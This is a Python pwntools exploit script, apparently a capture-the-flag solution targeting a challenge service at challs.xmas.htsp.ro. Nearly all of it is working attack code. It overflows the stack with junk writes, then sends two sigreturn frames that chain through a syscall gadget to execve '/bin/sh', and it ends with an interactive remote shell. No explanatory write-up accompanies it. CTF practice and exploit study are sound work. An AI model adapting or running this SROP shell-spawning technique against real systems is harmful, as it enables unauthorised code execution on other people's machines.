#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import os
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./main')
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 2002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x401193
b *0x40116f
disable 2
continue
enable 2
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = start()
syscall_main=0x40116f
leave_ret=0x00000000401193
with context.local(log_level='warn'), \
    log.progress(f'Filling array with junk : 30 ', level=logging.WARN) as buf:
    for i in range(30):
        io.recv()
        io.send(p64(0xdeadbeef))
        buf.status(str(i))

with context.local(log_level='warn'), \
    log.progress('Filling stack with junk : 8126 ', level=logging.WARN) as stack:
    for i in range(8156-30):
        io.recv()
        io.send(b"A"*8)
        stack.status(str(i))

frame = SigreturnFrame()
frame.rax = 0x0
frame.rbx = 0x0
frame.rcx = 0x0
frame.rdx = 0x1337
frame.rdi = 0x0
frame.rsi = 0x402058
frame.r8 =  0x0
frame.r9 =  0x0
frame.r10 = 0x0
frame.r11 = 0x0
frame.r12 = 0x0
frame.r13 = 0x0
frame.r14 = 0x0
frame.r15 = 0x0
frame.rsp = leave_ret
frame.rbp = 0x402058-8
frame.rip = syscall_main

def seperate(string, n=8):
    split_strings = [string[index : index + n] for index in range(0, len(string), n)]
    return split_strings

syscall_frame=bytes(frame)
syscall_frame=seperate(syscall_frame, 8)[::-1]

with context.local(log_level='warn'), \
    log.progress(f'Sending SigFrame Payload 1 : 31 ', level=logging.WARN) as sf1:
    for i in range(31):
        io.recv()
        io.send(syscall_frame[i])
        sf1.status(str(i))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rbx = 0x0
frame.rcx = 0x0
frame.rdx = 0x0
frame.rdi = 0x402160
frame.rsi = 0x0
frame.rsp = syscall_main
frame.rbp = 0xcafebabe
frame.rip = syscall_main
log.info("Triggering SigFrame Payload 1")
io.recv()
io.send(p64(0x00000000401199)) # mov_eax_0x3f_sys
io.recv()
io.send(b"/quit") # trigger first sigrop
pause()
log.info("Triggering SigFrame Payload 2")
io.send(p64(0x00000000401199) + bytes(frame) + b"A"*8 + b"/bin/sh\x00")
io.recv()
io.send(b"/quit") # trigger second sigrop
io.interactive()
